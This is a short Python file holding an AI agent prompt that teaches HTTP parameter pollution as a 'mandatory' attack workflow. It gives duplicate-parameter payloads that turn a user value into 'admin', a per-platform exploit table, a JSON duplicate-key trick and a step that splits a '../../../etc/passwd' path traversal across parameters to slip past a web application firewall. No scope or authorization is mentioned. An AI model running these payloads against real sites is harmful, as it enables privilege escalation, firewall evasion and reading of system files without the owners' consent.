"""
HTTP Parameter Pollution Attack Skill Prompt.
"""

PARAMETER_POLLUTION_SKILL_PROMPT = """
## ATTACK SKILL: HTTP PARAMETER POLLUTION (HPP)

### MANDATORY WORKFLOW

#### STEP 1: DETECTION
Send the same parameter multiple times with different values:
```
GET /search?q=normal&q=injected
POST /login  ->  user=normal&user=admin
```

#### STEP 2: EXPLOITATION BY PLATFORM

| Platform | Behavior | Exploit |
|----------|----------|---------|
| PHP/Apache | Last occurrence wins | `?user=normal&user=admin` -> admin |
| ASP.NET/IIS | Comma-concatenated | `?user=normal,admin` |
| JSP/Tomcat | First occurrence wins | `?user=admin&user=normal` -> admin |
| Python/Flask | Returns list (array) | `?user=admin&user=normal` -> `['admin','normal']` |
| Node.js/Express | Query string: last wins; Body: depends on parser | Test both |

#### STEP 3: WAF BYPASS
```
?file=../../../etc/passwd  -> blocked
?file=../../../etc&file=/passwd  -> may bypass WAF, backend concatenates
```

#### STEP 4: JSON DUPLICATE KEYS
```json
{"user": "normal", "user": "admin"}
```
Different parsers choose first or last key — test both.

#### ANTI-PATTERNS: Don't just test query strings — test POST body, cookies, and JSON duplicate keys.
"""
